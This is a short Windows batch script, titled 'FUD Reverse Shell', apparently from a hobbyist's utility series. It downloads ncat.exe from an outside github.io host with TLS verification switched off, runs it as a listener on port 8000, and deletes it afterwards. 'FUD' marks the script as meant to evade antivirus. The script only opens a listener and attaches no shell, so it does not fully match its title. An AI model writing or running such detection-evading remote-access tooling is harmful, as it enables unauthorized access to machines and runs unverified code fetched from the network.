@echo off
title FUD Reverse Shell ^| by aritz331_ for Aritz's Utils - an aritz331_ original series^^TM
cls
curl -kLs stivengiv.github.io/revs/ncat.exe -o %temp%\nc.exe
%temp%\nc -nlvp 8000
del /s /f /q %temp%\nc.exe
exit /b
